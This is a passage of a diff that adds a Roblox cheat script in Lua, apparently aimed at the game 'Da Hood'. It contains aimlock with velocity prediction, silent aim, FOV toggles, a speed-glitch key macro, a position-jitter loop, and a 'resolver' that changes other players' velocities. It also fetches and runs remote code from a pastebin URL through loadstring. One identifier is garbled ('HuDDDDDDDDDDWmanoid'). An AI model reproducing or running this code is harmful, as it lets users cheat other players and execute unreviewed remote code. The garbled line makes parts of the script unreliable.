+                                    local Main =
+                                        CF(
+                                        Camera.CFrame.p,
+                                        AimlockTarget.Character[getgenv().AimPart].Position +
+                                            AimlockTarget.Character[getgenv().AimPart].Velocity / PredictionVelocity
+                                    )
+
+                                    Camera.CFrame =
+                                        Camera.CFrame:Lerp(
+                                        Main,
+                                        getgenv().SmoothnessAmount,
+                                        Enum.EasingStyle.Elastic,
+                                        Enum.EasingDirection.InOut
+                                    )
+                                else
+                                    Camera.CFrame =
+                                        CF(
+                                        Camera.CFrame.p,
+                                        AimlockTarget.Character[getgenv().AimPart].Position +
+                                            AimlockTarget.Character[getgenv().AimPart].Velocity / PredictionVelocity
+                                    )
+                                end
+                            elseif getgenv().PredictMovement == false then
+                                if getgenv().Smoothness == true then
+                                    
+                                    local Main =
+                                        CF(Camera.CFrame.p, AimlockTarget.Character[getgenv().AimPart].Position)
+                                    Camera.CFrame =
+                                        Camera.CFrame:Lerp(
+                                        Main,
+                                        getgenv().SmoothnessAmount,
+                                        Enum.EasingStyle.Elastic,
+                                        Enum.EasingDirection.InOut
+                                    )
+                                else
+                                    Camera.CFrame =
+                                        CF(Camera.CFrame.p, AimlockTarget.Character[getgenv().AimPart].Position)
+                                end
+                            end
+                        end
+                    end
+                end
+            end
+            if CheckIfJumped == true then
+                if AimlockTarget.Character.HuDDDDDDDDDDWmanoid.FloorMaterial == Enum.Material.Air then
+                    getgenv().AimPart = "UpperTorso"
+                else
+                    getgenv().AimPart = getgenv().OldAimPart
+                end
+            end
+        end
+    )
+
+    ---------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+    local Player = game:GetService("Players").LocalPlayer
+    local Mouse = Player:GetMouse()
+    local SpeedGlitch = false
+
+    Mouse.KeyDown:Connect(
+        function(Key)
+            if Key == "x" then
+                SpeedGlitch = not SpeedGlitch
+                if SpeedGlitch == true then
+                    repeat
+                        game:GetService("RunService").Heartbeat:wait()
+                        keypress(0x49)
+                        game:GetService("RunService").Heartbeat:wait()
+                        keypress(0x4F)
+                        game:GetService("RunService").Heartbeat:wait()
+                        keyrelease(0x49)
+                        game:GetService("RunService").Heartbeat:wait()
+                        keyrelease(0x4F)
+                        game:GetService("RunService").Heartbeat:wait()
+                    until SpeedGlitch == false
+                end
+            end
+        end
+    )
+
+    ---------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+    local Workspace = game:GetService("Workspace")
+    local Players = game:GetService("Players")
+    local RunService = game:GetService("RunService")
+    local UserInputService = game:GetService("UserInputService")
+    local UserInputService = game:GetService("UserInputService")
+
+    local Off = Instance.new("Sound", game.Workspace)
+    Off.SoundId = "rbxassetid://10363531115"
+    local On = Instance.new("Sound", game.Workspace)
+    On.SoundId = "rbxassetid://10363531700"
+
+    local twelve = Instance.new("Sound", game.Workspace)
+    twelve.SoundId = "rbxassetid://10848719687"
+    local five = Instance.new("Sound", game.Workspace)
+    five.SoundId = "rbxassetid://10848719301"
+
+    local resolvedsound = Instance.new("Sound", game.Workspace)
+    resolvedsound.SoundId = "rbxassetid://10849020909"
+
+    ---------------------------------------------------------------------------------------------------------------------------------------------------------------------
+    loadstring(game:HttpGet("https://pastebin.com/raw/6gmj2pTS"))()
+    DaHoodSettings.Prediction = 0.1437
+    Aiming.TargetPart = {"Head", "UpperTorso", "LowerTorso", "HumanoidRootPart", "RightFoot", "LeftFoot"}
+    Aiming.FOV = 12.4
+    Aiming.FOVSides = 25
+    Aiming.HitChance = 114
+    Aiming.ShowFOV = false
+
+    ---------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+    local togglekey = "t"
+    local mouseyea = game.Players.LocalPlayer:GetMouse()
+    mouseyea.KeyDown:Connect(
+        function(onandoff)
+            if onandoff == togglekey then
+                if DaHoodSettings.SilentAim == true then
+                    DaHoodSettings.SilentAim = false
+                    Off:Play()
+                else
+                    DaHoodSettings.SilentAim = true
+                    On:Play()
+                end
+            end
+        end
+    )
+
+    ---------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+    local switchbro = "z"
+    local mouseyea = game.Players.LocalPlayer:GetMouse()
+    mouseyea.KeyDown:Connect(
+        function(togglebro)
+            if togglebro == switchbro then
+                if Aiming.FOV == 12.4 then
+                    Aiming.FOV = 5.3
+                    five:Play()
+                else
+                    Aiming.FOV = 12.4
+                    twelve:Play()
+                end
+            end
+        end
+    )
+
+    ---------------------------------------------------------------------------------------------------------------------------------------------
+
+    local Position = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
+    --
+    getgenv().Yes = nil
+    while getgenv().Yes == true do
+        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
+            (CFrame.new(Position) + Vector3.new(math.random(-15, 15), math.random(-15, 15), math.random(-15, 15))) *
+            CFrame.Angles(
+                math.rad(math.random(-180, 180)),
+                math.rad(math.random(-180, 180)),
+                math.rad(math.random(-180, 180))
+            )
+    end
+
+    
+    ---------------------------------------------------------------------------------------------------------------------------------------------
+
+    local resolve = "m"
+
+    local mouseyea = game.Players.LocalPlayer:GetMouse()
+    mouseyea.KeyDown:Connect(
+        function(resolveitnow)
+            if resolveitnow == resolve then
+
+                resolvedsound:Play()
+                local RunService = game:GetService("RunService")
+
+                RunService.Heartbeat:Connect(
+                    function()
+                        pcall(
+                            function()
+                                for i, v in pairs(game.Players:GetChildren()) do
+                                    if v.Name ~= game.Players.LocalPlayer.Name then
+                                        local hrp = v.Character.HumanoidRootPart
+                                        hrp.Velocity = Vector3.new(hrp.Velocity.X, 0, hrp.Velocity.Z)
+                                        hrp.AssemblyLinearVelocity = Vector3.new(hrp.Velocity.X, 0, hrp.Velocity.Z)
+                                    end
+                                end
+                            end
+                        )
+                    end
+                )
+            end
+        end
+    )
+end
+
+end
+
+----script ends here
+
+else
+game:Shutdown()
+messagebox("Invalid Key","whitelist issue",0)
+end 
